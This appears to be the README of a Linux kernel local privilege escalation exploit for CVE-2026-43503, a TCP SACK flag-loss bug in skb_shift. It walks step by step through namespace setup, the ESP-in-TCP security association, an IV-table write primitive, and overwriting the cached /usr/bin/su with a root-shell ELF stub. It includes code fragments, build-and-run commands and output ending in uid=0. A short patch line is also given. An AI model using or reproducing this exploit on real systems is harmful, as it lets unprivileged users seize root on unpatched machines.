# skb_shift (CVE-2026-43503) — Local Privilege Escalation via TCP SACK Flag Loss

A page-cache corruption vulnerability in the Linux kernel's TCP SACK processing that achieves controlled byte-at-a-time writes to arbitrary readable files, producing a root shell in ~10 seconds.

**CVE:** CVE-2026-43503
**Bypasses:** CVE-2026-43284 (Dirty Frag) and CVE-2026-46300 (Fragnesia) patches.

---

## Summary

`skb_shift()` moves frag descriptors between retransmit-queue skbs during TCP SACK coalescing via direct struct assignment — without propagating `SKBFL_SHARED_FRAG`. The Dirty Frag patch introduced this flag as a defense, but `skb_shift` silently drops it. When the shifted skb is later decrypted by ESP-in-TCP, the in-place AES-GCM operation writes directly into page-cache pages.

Combined with a pre-computed IV lookup table, this gives a controlled byte-at-a-time write primitive — any byte in any readable file can be set to any desired value.

---

## Root Cause

**Location:** `net/core/skbuff.c:4328` — function `skb_shift()`

```c
*fragto = *fragfrom;  // struct assignment copies frag descriptor
// DOES NOT propagate SKBFL_SHARED_FRAG from source skb to destination
```

### The Chain

1. `splice(file → TCP socket)` creates skbs with page-cache frags. TCP marks them with `SKBFL_SHARED_FRAG`.
2. TCP SACK processing: `tcp_sacktag_walk → tcp_shift_skb_data → skb_shift` merges frags between retransmit-queue skbs.
3. `skb_shift` copies frag descriptors via struct assignment — flag is NOT propagated.
4. Destination skb now has page-cache frags WITHOUT the defense flag.
5. When retransmitted, `tcp_transmit_skb → skb_clone` creates a clone inheriting the (flag-less) state.
6. On loopback, the clone reaches the receiver's espintcp ULP.
7. ESP input: `!skb_has_shared_frag(skb)` → true (flag was lost!) → `skip_cow`.
8. In-place AES-GCM decrypt XORs keystream directly into page-cache pages.

---

## What Makes This Exploit Unique

### 1. Bypasses the Dirty Frag Defense

The Dirty Frag patch (CVE-2026-43284) added `SKBFL_SHARED_FRAG` checking to ESP input. This fix works — IF the flag is present. `skb_shift` silently removes it during SACK processing, rendering the defense useless.

### 2. Controlled Write via IV Table

AES-GCM counter mode: the keystream byte at a given position is deterministic given the key + IV (nonce). Since we control the XFRM SA key and the IV in each ESP packet:

```
For each possible keystream byte (0-255):
    Find the IV/nonce that produces that byte at counter position 2
    Store in table: desired_keystream[byte] = nonce
```

To write `desired_byte` over `current_byte`:
```
needed_keystream = current_byte XOR desired_byte
nonce = table[needed_keystream]
Send ESP packet with that nonce → XOR produces desired_byte
```

No brute force. 256-entry table computed once. Every byte write is one-shot.

### 3. Raw SACK Injection

The exploit injects crafted TCP SACK options via a raw socket to force the kernel into the `tcp_shift_skb_data` path. This is more reliable than waiting for natural SACK processing.

---

## Exploitation

### Step-by-Step

#### 1. User Namespace

```c
unshare(CLONE_NEWUSER | CLONE_NEWNET);
// CAP_NET_ADMIN in new network namespace
```

#### 2. Network Setup

```c
// Loopback with routable address
ip addr add 10.0.0.1/24 dev lo
sysctl accept_local=1, rp_filter=0
```

#### 3. XFRM SA Installation

```c
// ESP-in-TCP Security Association
// AES-128-GCM with known key + salt
// encap_type = 7 (TCP_ENCAP_ESPINTCP)
// replay_window = 0 (disable anti-replay)
```

#### 4. IV Table Precomputation

```c
// 256-entry table mapping keystream_byte → IV_nonce
// Generated offline, hardcoded in exploit
// For key "SHIFT_KEY_POC!!!" salt 0xcafebabe
```

#### 5. Per-Byte Write Loop (192 iterations)

For each byte in the 192-byte ELF stub:

```c
// a. Read current byte of /usr/bin/su
current = read_byte(target, offset);

// b. Compute needed keystream
needed_ks = current ^ desired;
if (needed_ks == 0) continue;  // already correct

// c. Look up IV from table
nonce = iv_table[needed_ks];

// d. Create TCP connection on rotating port
// e. TCP_CORK, write ESP header (SPI + seq + chosen IV)
// f. splice(target_file, offset) into TCP socket
// g. Write ESP trailer, uncork
// h. Receiver: accept, sleep 100ms, install espintcp ULP
// i. Kernel decrypts in-place → one page-cache byte changed
```

#### 6. Escalation

```c
// After 192 bytes written:
// /usr/bin/su page cache = ELF stub:
//   setresuid(0,0,0) + setresgid(0,0,0) + execve("/bin/sh")
execve("/usr/bin/su", NULL, NULL);
// → root shell
```

---

## Output

```
[*] uid=1000 euid=1000
[*] IV table pre-computed (256 entries)
[*] Writing 192 bytes to /usr/bin/su...
  [ 0] 0x7f→0x7f ... skip (already correct)
  [ 1] 0x45→0x45 ... skip (already correct)
  [ 2] 0x4c→0x4c ... skip (already correct)
  [ 3] 0x46→0x46 ... skip (already correct)
  [ 4] 0x02→0x02 ... skip (already correct)
  ...
  [120] 0x00→0x48 ... OK
  [121] 0x00→0x31 ... OK
  ...
[*] Write complete: 192 OK, 0 FAIL out of 192
[!] /usr/bin/su page cache overwritten!
[!] 192-byte ELF stub: setresuid(0) + execve(/bin/sh)
[!] Executing /usr/bin/su...
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Key Properties

| Property | Value |
|----------|-------|
| Privileges required | None (user namespaces only) |
| File access needed | O_RDONLY on target |
| Write granularity | 1 byte per trigger (via IV table) |
| Reliability | Deterministic (SACK injection is reliable) |
| Time to root | ~10 seconds (192 TCP connections) |
| Crypto required | Yes (XFRM/ESP AES-128-GCM) |
| Lines of code | ~500 |
| Target | `/usr/bin/su` (first 192 bytes) |
| Escalation | ELF stub → setresuid(0) → execve("/bin/sh") |
| Attack surface | Any Linux with TCP + XFRM + user namespaces |

---

## espintcp Infrastructure Details

### Routing Fix

`xfrm4_rcv_encap → ip_route_input_noref` rejects 127.0.0.1 as martian source. Fix: use 10.0.0.1 on loopback with `accept_local=1` and `rp_filter=0`.

### TCP_CORK Required

Without cork, ESP header (18 bytes) sends as separate segment. IP `tot_len` mismatch causes XFRM validation failures. Cork batches header + spliced payload + trailer into one segment.

### ESP-in-TCP Record Format (RFC 8229)

```
[BE16 length][SPI 4][Seq 4][IV 8][payload N][pad 1][NH 1][ICV 16]
length = N + 34
```

### SA Configuration

```
XFRM_MODE_TRANSPORT, IPPROTO_ESP
rfc4106(gcm(aes)) 128-bit key, ICV 128-bit
encap_type = 7 (TCP_ENCAP_ESPINTCP)
replay_window = 0 (disable anti-replay)
addr = 10.0.0.1 (both src and dst on loopback)
```

---

## Fix

Propagate `SKBFL_SHARED_FRAG` during frag struct assignment in `skb_shift`:

```c
skb_shinfo(tgt)->flags |= skb_shinfo(skb)->flags & SKBFL_SHARED_FRAG;
```

---

## Build & Run

```bash
gcc -O2 -Wall -static -o root_exploit root_exploit.c
./root_exploit
# → root shell in ~10 seconds
```

## Affected Configurations

- Any Linux kernel with `CONFIG_XFRM` + `CONFIG_INET_ESP` + `CONFIG_USER_NS`
- espintcp ULP support (mainline since 5.7)
- Kernel versions: v3.9 (2013) through v7.1-rc4 — introduced 13 years ago, fixed in v7.1-rc5 (commit `48f6a5356a33`)
- All major distros: Ubuntu, Fedora, Debian, RHEL 8/9/10, SUSE — all vulnerable in default config

